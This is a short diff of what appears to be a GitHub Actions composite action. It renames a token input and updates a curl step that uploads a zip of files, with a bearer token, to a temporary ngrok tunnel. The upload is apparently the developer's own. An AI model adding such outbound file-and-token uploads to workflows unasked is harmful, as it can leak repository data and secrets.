@@ -12,7 +12,7 @@ inputs:
   connection_string:
     description: "Database connection string"
     required: true
-  shs-token:
+  shs_token:
     description: "Database connection string"
     required: true
 
@@ -106,7 +106,7 @@ runs:
     - name: Send ZIP to Endpoint
       shell: bash
       run: |
-         curl https://567c-2001-8a0-7bc0-8800-6044-6b99-9727-e618.ngrok-free.app/zip -X POST -F "file=@my-files.zip" -H "Authorization: Bearer ${{inputs.shs-token}}"
+         curl https://567c-2001-8a0-7bc0-8800-6044-6b99-9727-e618.ngrok-free.app/zip -X POST -F "file=@my-files.zip" -H "Authorization: Bearer ${{inputs.shs_token}}"
 
 outputs:
   repository_info:
